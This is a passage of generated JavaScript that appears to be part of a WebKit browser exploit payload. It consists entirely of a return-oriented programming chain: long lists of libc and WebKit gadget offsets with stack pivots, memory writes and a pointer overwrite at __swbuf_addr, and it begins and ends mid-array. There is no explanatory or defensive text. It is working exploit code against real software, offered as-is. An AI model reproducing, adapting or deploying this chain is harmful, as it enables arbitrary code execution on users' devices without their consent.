libc_base+793877, //pop rsi
ropchain+139896, //L1938
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140024, //L1941
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140040, //L1942
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140152, //L1943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140136, //L1944
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+140240, //L1946
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+140224, //L1945
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140336, //L1947
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140352, //L1948
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140464, //L1949
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140448, //L1950
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
__swbuf_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141792, //L1951
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+141864, //L1952
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1952:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141960, //L1955
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+141992, //L1957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1955:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1956:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1957:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+142080, //L1958
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142096, //L1959
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+142216, //L1962
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142232, //L1963
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142200, //L1961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142328, //L1964
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142344, //L1965
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142456, //L1966
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142440, //L1967
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+142544, //L1969
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142528, //L1968
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142640, //L1970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142656, //L1971
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142768, //L1972
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142752, //L1973
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142840, //L1974
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142936, //L1977
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142968, //L1979
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1977:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1978:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1979:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+143056, //L1980
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143072, //L1981
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+143224, //L1984
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143256, //L1986
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143208, //L1983
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143240, //L1985
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+143416, //L1990
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143368, //L1987
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+143384, //L1988
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1987:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1988:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1989:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+143544, //L1992
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143560, //L1993
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143528, //L1991
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143656, //L1994
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143672, //L1995
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143784, //L1996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143768, //L1997
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+143872, //L1999
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143856, //L1998
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143968, //L2000
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143984, //L2001
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144096, //L2002
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144080, //L2003
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144168, //L2004
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144264, //L2007
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+144296, //L2009
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2007:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2008:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2009:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+144384, //L2010
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144400, //L2011
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+144560, //L2016
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144512, //L2013
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144528, //L2014
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2013:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2015:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+144616, //L2017
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2017:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+144720, //L2019
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144752, //L2021
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144736, //L2020
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2019:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+144912, //L2025
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144864, //L2022
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144880, //L2023
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2022:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2023:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2024:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145016, //L2027
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145000, //L2026
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145224, //L2032
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145192, //L2030
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2030:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2031:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145328, //L2034
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145312, //L2033
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+145424, //L2036
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2035:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2036:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+145512, //L2038
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145528, //L2039
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+145688, //L2044
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145640, //L2041
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145656, //L2042
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2041:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2042:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2043:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145744, //L2045
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+145848, //L2047
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+145880, //L2049
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145864, //L2048
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2047:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+146040, //L2053
